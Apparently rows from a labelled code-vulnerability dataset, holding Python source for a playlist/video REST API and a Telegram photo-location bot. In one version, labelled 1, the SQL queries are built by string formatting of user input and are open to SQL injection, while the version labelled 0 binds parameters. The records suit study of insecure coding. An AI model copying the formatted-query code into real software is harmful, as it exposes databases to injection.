    assert response2.json['data'] == [dict(id=1, name='nn')]


def test_should_update_a_playlist_name():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.put('/playlists/1/name')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/playlists')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, name='name')]


def test_should_delete_a_playlist_and_remove_all_its_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.delete('/playlists/1')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == None

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []


def test_should_return_all_the_videos_from_a_playlist():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, title='the title of the video',
                                          thumbnail='the url of the video', position=1),
                                     dict(id=2, title='the title of the video',
                                          thumbnail='the url of the video', position=2)]


def test_should_return_all_the_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')
    create_video(1, 'f title',
                 'f url', 1)
    create_video(1, 's title',
                 's url', 2)
    create_video(1, 't title',
                 't url', 3)
    create_video(2, 'f title',
                 'f url', 1)
    create_video(2, 'fh title',
                 'fh url', 2)

    response = test_app.get('/videos')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=2, playlist_id=1, title='s title',
                                          thumbnail='s url', position=2),
                                     dict(id=3, playlist_id=1, title='t title',
                                          thumbnail='t url', position=3),
                                     dict(id=4, playlist_id=2, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=5, playlist_id=2, title='fh title',
                                          thumbnail='fh url', position=2)]


def test_should_create_a_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]


def test_should_update_a_video_position():
    populate_test_database()

    create_playlist('first playlist')

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)
    create_video(1, 'title3', 'thumbnail3', 3)
    create_video(1, 'title4', 'thumbnail4', 4)

    response = test_app.put('/videos/4/1/2')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/videos/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=4, title='title4',
                                           thumbnail='thumbnail4', position=2),
                                      dict(id=2, title='title2',
                                           thumbnail='thumbnail2', position=3),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]


def test_should_delete_a_video_given_an_id_and_update_playlist_video_position():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.delete('/videos/1/1')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []

    response4 = test_app.get('/playlists/1')

    assert response4.json['status'] == 'OK'
    assert response4.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_reorder_video_position_given_a_deleted_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.post('/videos/1/title3/thumbnail3')
    assert response3.json['status'] == 'OK'

    response4 = test_app.delete('/videos/2/1')
    assert response4.json['status'] == 'OK'

    response5 = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]

    response6 = test_app.get('/playlists/1')
    assert response6.json['status'] == 'OK'
    assert response6.json['data'] == dict(
        id=1, name='first playlist', video_position=2)


def test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.delete('/playlists/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.put('/playlists/2/name')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/2/title/thumbnail')

    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():
    populate_test_database()

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():
    populate_test_database()

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None

    response2 = test_app.put('/videos/1/1/5')
    assert response2.json['status'] == 'NOK'
    assert response2.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/2/1')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None
/n/n/nplaylist/playlist_repository.py/n/n""""""This module is the playlist repository in charge of all database requests.""""""


def retrieve_playlists(db):
    db.execute('SELECT id, name from playlist;')
    rows = db.fetchall()
    return rows


def retrieve_playlist_by_id(id, db):
    db.execute(
        ""SELECT id, name, video_position from playlist WHERE id=%s;"", (id,))
    row = db.fetchone()
    return row


def delete_playlist(id, db):
    db.execute(""DELETE FROM playlist where id=%s;"", (id,))


def update_playlist(id, name, db):
    db.execute(""UPDATE playlist SET name=%s WHERE id=%s;"", (name, id,))


def update_playlist_video_position(id, position, db):
    db.execute(""UPDATE playlist SET video_position=%s WHERE id=%s;"",
               (position, id))


def create_playlist(name, db):
    db.execute(
        ""INSERT INTO playlist (name, video_position) VALUES(%s, 0);"", (name,))
/n/n/nvideo/video_repository.py/n/n""""""This module is the video repository in charge of all database requests.""""""


def retrieve_videos_from_playlist(playlist_id, db):
    db.execute(""SELECT id, title, thumbnail, position from video WHERE playlist_id=%s ORDER BY position ASC;"", (playlist_id,))
    rows = db.fetchall()
    return rows


def retrieve_videos(db):
    db.execute(
        ""SELECT id, playlist_id, title, thumbnail, position from video ORDER BY playlist_id ASC, position ASC;"")
    rows = db.fetchall()
    return rows


def retrieve_video(id, playlist_id, db):
    db.execute(
        ""SELECT id, position from video WHERE id=%s and playlist_id=%s;"", (id, playlist_id))
    row = db.fetchone()
    return row


def retrieve_last_video_position(playlist_id, db):
    db.execute(
        ""SELECT max(position) as position from video WHERE playlist_id=%s;"", (playlist_id,))
    row = db.fetchone()
    return row['position']


def delete_video(id, db):
    db.execute(""DELETE FROM video where id=%s;"", (id,))


def delete_playlists_videos(playlist_id, db):
    db.execute(""DELETE FROM video where playlist_id=%s;"", (playlist_id,))


def create_video(playlist_id, title, thumbnail, position, db):
    db.execute(""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES(%s, %s, %s, %s);"",
               (playlist_id, title, thumbnail, position))


def update_video_positions(removed_position, db):
    db.execute(""UPDATE video SET position = position - 1 WHERE position > %s"", (removed_position,))


def update_video_position(id, position, next_position, db):
    db.execute(""UPDATE video SET position = Case position When %s Then %s Else position + 1 End WHERE position BETWEEN %s AND %s;"", (position, next_position, next_position, position))
/n/n/n",0
77,77,666e52c5f0b8c1f4296e84471637033d9542a7a6,"/main_test.py/n/nimport pytest
import bottle
import webtest
import MySQLdb
import os

from logging import getLogger
from bottle_mysql import Plugin

from video import video_api
from playlist import playlist_api

from database import populate_test_database

logger = getLogger()

app = bottle.default_app()
plugin = Plugin(dbuser=os.environ[""USER""], dbpass=os.environ[""PASSWORD""], dbname='test')
app.install(plugin)
test_app = webtest.TestApp(app)


def create_video(playlist_id, title, thumbnail, position):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        ""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES('{playlist_id}', '{title}', '{thumbnail}', '{position}');"".format(
            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))
    db.commit()
    db.close()


def create_playlist(name):
    db = connect_to_database()
    cursor = db.cursor()
    cursor.execute(
        ""INSERT INTO playlist (name, video_position) VALUES('{name}', 0);"".format(name=name))
    db.commit()
    db.close()


def connect_to_database():
    db = MySQLdb.connect(""localhost"", ""root"", os.environ[""PASSWORD""], 'test')
    return db


def test_should_return_all_playlists():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')

    response = test_app.get('/playlists')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, name='first playlist'),
                                     dict(id=2, name='second playlist')]


def test_should_return_a_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.get('/playlists/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_create_a_playlist():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == [dict(id=1, name='nn')]


def test_should_update_a_playlist_name():
    populate_test_database()

    response = test_app.post('/playlists/nn')
    assert response.json['status'] == 'OK'

    response2 = test_app.put('/playlists/1/name')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/playlists')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, name='name')]


def test_should_delete_a_playlist_and_remove_all_its_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.delete('/playlists/1')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/playlists/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == None

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []


def test_should_return_all_the_videos_from_a_playlist():
    populate_test_database()

    create_playlist('first playlist')
    create_video(1, 'the title of the video',
                 'the url of the video', 1)
    create_video(1, 'the title of the video',
                 'the url of the video', 2)

    response = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, title='the title of the video',
                                          thumbnail='the url of the video', position=1),
                                     dict(id=2, title='the title of the video',
                                          thumbnail='the url of the video', position=2)]


def test_should_return_all_the_videos():
    populate_test_database()

    create_playlist('first playlist')
    create_playlist('second playlist')
    create_video(1, 'f title',
                 'f url', 1)
    create_video(1, 's title',
                 's url', 2)
    create_video(1, 't title',
                 't url', 3)
    create_video(2, 'f title',
                 'f url', 1)
    create_video(2, 'fh title',
                 'fh url', 2)

    response = test_app.get('/videos')
    assert response.json['status'] == 'OK'
    assert response.json['data'] == [dict(id=1, playlist_id=1, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=2, playlist_id=1, title='s title',
                                          thumbnail='s url', position=2),
                                     dict(id=3, playlist_id=1, title='t title',
                                          thumbnail='t url', position=3),
                                     dict(id=4, playlist_id=2, title='f title',
                                          thumbnail='f url', position=1),
                                     dict(id=5, playlist_id=2, title='fh title',
                                          thumbnail='fh url', position=2)]


def test_should_create_a_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=2, title='title2', thumbnail='thumbnail2', position=2)]


def test_should_update_a_video_position():
    populate_test_database()

    create_playlist('first playlist')

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)
    create_video(1, 'title3', 'thumbnail3', 3)
    create_video(1, 'title4', 'thumbnail4', 4)

    response = test_app.put('/videos/4/1/2')
    assert response.json['status'] == 'OK'

    response2 = test_app.get('/videos/1')
    assert response2.json['status'] == 'OK'
    assert response2.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=4, title='title4',
                                           thumbnail='thumbnail4', position=2),
                                      dict(id=2, title='title2',
                                           thumbnail='thumbnail2', position=3),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=4)]


def test_should_delete_a_video_given_an_id_and_update_playlist_video_position():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.delete('/videos/1/1')
    assert response2.json['status'] == 'OK'

    response3 = test_app.get('/videos/1')
    assert response3.json['status'] == 'OK'
    assert response3.json['data'] == []

    response4 = test_app.get('/playlists/1')

    assert response4.json['status'] == 'OK'
    assert response4.json['data'] == dict(
        id=1, name='first playlist', video_position=0)


def test_should_reorder_video_position_given_a_deleted_video():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response2 = test_app.post('/videos/1/title2/thumbnail2')
    assert response2.json['status'] == 'OK'

    response3 = test_app.post('/videos/1/title3/thumbnail3')
    assert response3.json['status'] == 'OK'

    response4 = test_app.delete('/videos/2/1')
    assert response4.json['status'] == 'OK'

    response5 = test_app.get('/videos/1')
    assert response.json['status'] == 'OK'
    assert response5.json['data'] == [dict(id=1, title='title', thumbnail='thumbnail', position=1),
                                      dict(id=3, title='title3', thumbnail='thumbnail3', position=2)]

    response6 = test_app.get('/playlists/1')
    assert response6.json['status'] == 'OK'
    assert response6.json['data'] == dict(
        id=1, name='first playlist', video_position=2)


def test_should_return_a_not_ok_status_when_deleting_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.delete('/playlists/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.put('/playlists/2/name')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_creating_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/2/title/thumbnail')

    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_updating_a_video_from_an_unknown_id():
    populate_test_database()

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_either_specifying_an_out_of_bounds_or_similar_position():
    populate_test_database()

    create_video(1, 'title', 'thumbnail', 1)
    create_video(1, 'title2', 'thumbnail2', 2)

    response = test_app.put('/videos/1/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None

    response2 = test_app.put('/videos/1/1/5')
    assert response2.json['status'] == 'NOK'
    assert response2.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_from_an_unknown_playlist_id():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/1/2')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None


def test_should_return_a_not_ok_status_when_deleting_a_video_not_from_a_given_playlist():
    populate_test_database()

    create_playlist('first playlist')

    response = test_app.post('/videos/1/title/thumbnail')
    assert response.json['status'] == 'OK'

    response = test_app.delete('/videos/2/1')
    assert response.json['status'] == 'NOK'
    assert response.json['message'] != None
/n/n/n/playlist/playlist_repository.py/n/n""""""This module is the playlist repository in charge of all database requests.""""""


def retrieve_playlists(db):
    db.execute('SELECT id, name from playlist;')
    rows = db.fetchall()
    return rows


def retrieve_playlist_by_id(id, db):
    db.execute(
        ""SELECT id, name, video_position from playlist WHERE id={id};"".format(id=id))
    row = db.fetchone()
    return row


def delete_playlist(id, db):
    db.execute(""DELETE FROM playlist where id={id};"".format(id=id))


def update_playlist(id, name, db):
    db.execute(
        ""UPDATE playlist SET name='{name}' WHERE id={id};"".format(name=name, id=id))


def update_playlist_video_position(id, position, db):
    db.execute(
        ""UPDATE playlist SET video_position='{position}' WHERE id={id};"".format(position=position, id=id))


def create_playlist(name, db):
    db.execute(
        ""INSERT INTO playlist (name, video_position) VALUES('{name}', 0);"".format(name=name))
/n/n/n/video/video_repository.py/n/n""""""This module is the video repository in charge of all database requests.""""""


def retrieve_videos_from_playlist(playlist_id, db):
    db.execute(""SELECT id, title, thumbnail, position from video WHERE playlist_id={playlist_id} ORDER BY position ASC;"".format(
        playlist_id=playlist_id))
    rows = db.fetchall()
    return rows


def retrieve_videos(db):
    db.execute(
        ""SELECT id, playlist_id, title, thumbnail, position from video ORDER BY playlist_id ASC, position ASC;"")
    rows = db.fetchall()
    return rows


def retrieve_video(id, playlist_id, db):
    db.execute(""SELECT id, position from video WHERE id={id} and playlist_id={playlist_id};"".format(
        id=id, playlist_id=playlist_id))
    row = db.fetchone()
    return row


def retrieve_last_video_position(playlist_id, db):
    db.execute(""SELECT max(position) as position from video WHERE playlist_id={playlist_id};"".format(
        playlist_id=playlist_id))
    row = db.fetchone()
    return row['position']


def delete_video(id, db):
    db.execute(""DELETE FROM video where id={id};"".format(id=id))


def delete_playlists_videos(playlist_id, db):
    db.execute(""DELETE FROM video where playlist_id={playlist_id};"".format(
        playlist_id=playlist_id))


def create_video(playlist_id, title, thumbnail, position, db):
    db.execute(
        ""INSERT INTO video (playlist_id, title, thumbnail, position) VALUES({playlist_id}, '{title}', '{thumbnail}', {position});"".format(
            playlist_id=playlist_id, title=title, thumbnail=thumbnail, position=position))


def update_video_positions(removed_position, db):
    db.execute(""UPDATE video SET position = position - 1 WHERE position > {removed_position}"".format(
        removed_position=removed_position))


def update_video_position(id, position, next_position, db):
    db.execute(""UPDATE video SET position = Case position When {position} Then {next_position} Else position + 1 End WHERE position BETWEEN {next_position} AND {position};"".format(
        position=position, next_position=next_position))
/n/n/n",1
158,158,0e9f57f13e61863b3672f5730e27f149da00786a,"photogpsbot/__main__.py/n/n""""""
Small bot for Telegram that receives your photo and returns you map where
it was taken.
Written by Aleksandr Mikheev.
https://github.com/RandyRomero/photogpsbot

This specific module contains methods to respond user messages, to make
interactive menus, to handle user language, to process user images
""""""

# todo fix database queries in order to user parameters binding!

# todo check what is wrong with geopy on
#  last versions (some deprecation warning)

# todo rewrite the processing of images
# todo update docstrings and comments

from io import BytesIO
from datetime import datetime, timedelta

from telebot import types
import requests

from photogpsbot import bot, log, log_files, db, User, users, messages, machine
from photogpsbot.process_image import ImageHandler
from photogpsbot.db_connector import DatabaseConnectionError
import config


class PhotoMessage:
    def __init__(self, message, user):
        self.message = message
        self.user = user
        self.image_handler = ImageHandler

    @staticmethod
    def open_photo(message):
        # Get temporary link to a photo that user sends to the bot
        file_path = bot.get_file(message.document.file_id).file_path

        # Download photo that got the bot from a user
        link = (""https://api.telegram.org/file/""
                f""bot{config.TELEGRAM_TOKEN}/{file_path}"")

        if machine == 'prod':
            r = requests.get(link)
        else:
            # use proxy if the bot is running not on production server
            proxies = {'https': config.PROXY_CONFIG}
            r = requests.get(link, proxies=proxies)

        # Get file-like object of user's photo
        return BytesIO(r.content)

    def get_info(self):
        """"""
        Opens file that user sent as a file-like object, get necessary info
        from it and return it

        :return: instance of ImageData - my dataclass for storing info about
        an image like user, date, camera name etc
        """"""
        user_photo = self.open_photo(self.message)
        image = self.image_handler(self.user, user_photo)
        return image.get_image_info()

    def save_info_to_db(self, image_data):
        """"""
           When user send photo as a file to get information, bot also stores
           information about this query to the database to keep statistics that
           can be shown to a user in different ways. It stores time of query,
           Telegram id of a user, his camera and lens which were used for
           taking photo, his first and last name, nickname and country where
           the photo was taken. The bot does not save photos or their
           coordinates.

           :image_data: an instance of ImageData dataclass with info about
           the image
           :return: None
           """"""
        camera_name, lens_name = image_data.camera, image_data.lens
        camera_name = f'""{camera_name}""' if camera_name else None
        lens_name = f'""{lens_name}""' if lens_name else None

        if not image_data.country:
            country_en = country_ru = None
        else:
            country_en = f'""{image_data.country[""en-US""]}""'
            country_ru = f'""{image_data.country[""ru-RU""]}""'

        log.info('Adding user query to photo_queries_table...')

        query = ('INSERT INTO photo_queries_table '
                 '(chat_id, camera_name, lens_name, country_en, country_ru) '
                 'VALUES (%s, %s, %s, %s, %s)')

        parameters = (self.user.chat_id, camera_name, lens_name, country_en,
                      country_ru)

        db.execute_query(query, parameters)
        db.conn.commit()
        log.info('User query was successfully added to the database.')

    @staticmethod
    def find_num_users_with_same_feature(image_data):
        same_feature = []

        feature_types = ('camera_name', 'lens_name', 'country_en')
        features = (image_data.camera, image_data.lens,
                    image_data.country['en-US'])

        for feature_name, feature in zip(feature_types, features):
            if not feature:
                same_feature.append(0)
                continue
            answer = get_number_users_by_feature(feature, feature_name)
            same_feature.append(answer)

        return same_feature

    def prepare_answer(self):
        """"""
        Process an image that user sent, get info from it, save data to the
        database, make an answer to be sent via Telegram
        :return:
        """"""

        # Get instance of the dataclass ImageData with info about the image
        image_data = self.get_info()
        # Save some general info about the user's query to the database
        self.save_info_to_db(image_data)

        answer = ''
        coordinates = image_data.latitude, image_data.longitude
        if not coordinates[0]:
            answer += messages[self.user.language][""no_gps""]

        answ_template = messages[self.user.language][""camera_info""]
        basic_data = (image_data.date_time, image_data.camera, image_data.lens,
                      image_data.address[self.user.language])

        # Concatenate templates in language that user prefer with information
        # from the photo, for example: f'{""Camera brand""}:{""Canon 60D""}'
        for arg in zip(answ_template, basic_data):
            if arg[1]:
                answer += f'*{arg[0]}*: {arg[1]}\n'

        lang = self.user.language
        lang_templates = messages[lang][""users with the same feature""].values()
        ppl_wth_same_featrs = self.find_num_users_with_same_feature(image_data)
        for template, feature in zip(lang_templates, ppl_wth_same_featrs):
            if feature:
                answer += f'{template} {feature}\n'

        return coordinates, answer


def get_admin_stat(command):
    # Function that returns statistics to admin by command
    error_answer = ""Can't execute your command. Check logs""
    answer = 'There is some statistics for you: \n'

    # Set to a beginning of the day
    today = (datetime
             .today()
             .replace(hour=0, minute=0, second=0, microsecond=0)
             .strftime('%Y-%m-%d %H:%M:%S'))

    # Last users with date of last time when they used bot
    if command == 'last active users':

        try:
            last_active_users = users.get_last_active_users(100)
        except DatabaseConnectionError:
            return error_answer

        bot_users = ''
        # Makes a human readable list of last active users
        for usr, index in zip(last_active_users,
                              range(len(last_active_users))):
            user = User(*usr)
            bot_users += f'{index + 1}. {user}\n'

        answer = ('Up to 100 last active users by the time when they sent '
                  'picture last time:\n')
        answer += bot_users
        log.info('Done.')
        return answer

    elif command == 'total number photos sent':
        log.info('Evaluating total number of photo queries in database...')
        query = ('SELECT COUNT(chat_id) '
                 'FROM photo_queries_table2')
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer
        answer += '{} times users sent photos.'.format(cursor.fetchone()[0])
        query = ('SELECT COUNT(chat_id) '
                 'FROM photo_queries_table2 '
                 'WHERE chat_id !=%s')
        parameters = (config.MY_TELEGRAM,)
        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            answer += (""\nCannot calculate number of photos that were send ""
                       ""excluding your photos. Check logs"")
            return answer

        answer += '\nExcept you: {} times.'.format(cursor.fetchone()[0])
        log.info('Done.')
        return answer

    elif command == 'photos today':
        # Show how many photos have been sent since 00:00:00 of today
        log.info('Evaluating number of photos which were sent today.')
        query = (""SELECT COUNT(chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > %s"")

        parameters = (today,)

        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            return error_answer
        answer += f'{cursor.fetchone()[0]} times users sent photos today.'
        query = (""SELECT COUNT(chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > %s ""
                 ""AND chat_id !=%s"")

        parameters = today, config.MY_TELEGRAM

        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            return error_answer

        answer += '\nExcept you: {} times.'.format(cursor.fetchone()[0])
        log.info('Done.')
        return answer

    elif command == 'number of users':
        # Show number of users who has used bot at leas""
        # once or more (first for the whole time, then today)
        log.info('Evaluating number of users that use bot '
                 'since the first day and today...')
        try:
            num_of_users = users.get_total_number()
        except DatabaseConnectionError:
            return error_answer

        answer += f'There are totally {num_of_users} users.'

        query = (""SELECT COUNT(DISTINCT chat_id) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > %s"")

        parameters = (today,)
        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            answer += (""\nCannot calculate how many user have sent their ""
                       ""photos today"")
            return answer

        answer += f'\n{cursor.fetchone()[0]} users have sent photos today.'
        log.info('Done.')
        return answer

    elif command == 'number of gadgets':
        # To show you number smartphones + cameras in database
        log.info('Evaluating number of cameras and smartphones in database...')
        query = ('SELECT COUNT(DISTINCT camera_name) '
                 'FROM photo_queries_table2')
        try:
            cursor = db.execute_query(query)
        except DatabaseConnectionError:
            return error_answer
        answer += (f'There are totally {cursor.fetchone()[0]} '
                   f'cameras/smartphones.')
        query = (""SELECT COUNT(DISTINCT camera_name) ""
                 ""FROM photo_queries_table2 ""
                 ""WHERE time > %s"")
        parameters = (today,)
        try:
            cursor = db.execute_query(query, parameters)
        except DatabaseConnectionError:
            answer += (""Cannot calculate the number of gadgets that have been ""
                       ""used today so far"")
            return answer

        answer += (f'\n{cursor.fetchone()[0]} cameras/smartphones '
                   'were used today.')
        log.info('Done.')
        return answer

    elif command == 'uptime':
        fmt = 'Uptime: {} days, {} hours, {} minutes and {} seconds.'
        td = datetime.now() - bot.start_time
        # datetime.timedelta.seconds returns you total number of seconds
        # since given time, so you need to perform
        # a little bit of math to make whole hours, minutes and seconds from it
        # And there isn't any normal way to do it in Python unfortunately
        uptime = fmt.format(td.days, td.seconds // 3600, td.seconds % 3600 //
                            60, td.seconds % 60)
        log.info(uptime)
        return uptime


@bot.message_handler(commands=['start'])
def create_main_keyboard(message):
    user = users.find_one(message)
    current_user_lang = user.language
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
    markup.row('Русский/English')
    markup.row(messages[current_user_lang]['top_cams'])
    markup.row(messages[current_user_lang]['top_lens'])
    markup.row(messages[current_user_lang]['top_countries'])
    bot.send_message(user.chat_id, messages[current_user_lang]['menu_header'],
                     reply_markup=markup)


# Decorator to handle text messages
@bot.message_handler(content_types=['text'])
def handle_menu_response(message):
    # keyboard_hider = telebot.types.ReplyKeyboardRemove()
    current_user_lang = users.find_one(message).language
    user = users.find_one(message)

    if message.text == 'Русский/English':

        new_lang = users.find_one(message).switch_language()
        if current_user_lang != new_lang:
            bot.send_message(user.chat_id, messages[new_lang]
                             ['switch_lang_success'])
            create_main_keyboard(message)
        else:
            bot.send_message(user.chat_id, messages[new_lang]
                             ['switch_lang_failure'])
            create_main_keyboard(message)

    elif message.text == messages[current_user_lang]['top_cams']:
        log.info('User %s asked for top cams', user)
        bot.send_message(user.chat_id,
                         text=get_most_popular_items('camera_name', message))
        log.info('List of most popular cameras '
                 'has been returned to %s', user)

        # in order not to check whether user has changed his nickname or
        # whatever every time his sends any request the bot will just check
        # it every time a user wants to get a statistic about the most
        # popular cameras
        users.compare_and_update(user, message)

    elif message.text == messages[current_user_lang]['top_lens']:
        log.info('User %s asked for top lens', user)
        bot.send_message(user.chat_id,
                         text=get_most_popular_items('lens_name',
                                                     message))
        log.info('List of most popular lens has been returned to %s', user)

    elif message.text == messages[current_user_lang]['top_countries']:
        log.info('User %s asked for top countries', user)
        lang_table_name = ('country_ru'
                           if current_user_lang == 'ru-RU'
                           else 'country_en')
        bot.send_message(user.chat_id,
                         text=get_most_popular_items(lang_table_name, message))
        log.info('List of most popular countries has '
                 'been returned to %s', user)

    elif (message.text.lower() == 'admin' and
          user.chat_id == int(config.MY_TELEGRAM)):
        # Creates inline keyboard with options for admin Function that handle
        # user interaction with the keyboard called admin_menu

        keyboard = types.InlineKeyboardMarkup()  # Make keyboard object
        button = types.InlineKeyboardButton  # just an alias to save space

        keyboard.add(button(text='Turn bot off', callback_data='off'))
        keyboard.add(button(text='Last active users',
                            callback_data='last active'))
        keyboard.add(button(text='Total number of photos were sent',
                            callback_data='total number photos sent'))
        keyboard.add(button(text='Number of photos today',
                            callback_data='photos today'))
        keyboard.add(button(text='Number of users',
                            callback_data='number of users'))
        keyboard.add(button(text='Number of gadgets',
                            callback_data='number of gadgets'))
